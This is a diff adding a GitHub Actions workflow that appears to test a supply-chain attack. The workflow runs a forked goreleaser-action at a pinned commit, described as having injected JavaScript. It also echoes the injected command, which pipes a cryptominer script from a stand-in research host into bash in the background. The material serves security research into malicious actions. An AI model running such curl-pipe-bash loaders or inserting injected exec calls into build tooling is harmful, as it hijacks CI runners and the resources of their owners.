@@ -1,0 +1,19 @@
+name: "#10 act — cryptominer curl|bash"
+on: workflow_dispatch
+
+jobs:
+  test-act:
+    name: "act — cryptominer curl|bash"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Run forked goreleaser-action (injection at dist/index.js line 1)"
+        uses: rafidhaque/goreleaser-action@40a1d23610549dc39796036f45d7389f47ca621f
+        continue-on-error: true
+
+      - name: "Verify: exec fired (curl will fail, that's expected)"
+        run: |
+          echo "=== The injected JS runs: curl -sL https://eaction-research.example.com/miner.sh | bash & ==="
+          echo "=== Uses async exec() so it backgrounds immediately ==="
+          echo "=== curl fails (domain unresolvable) but proves the exec fires ==="
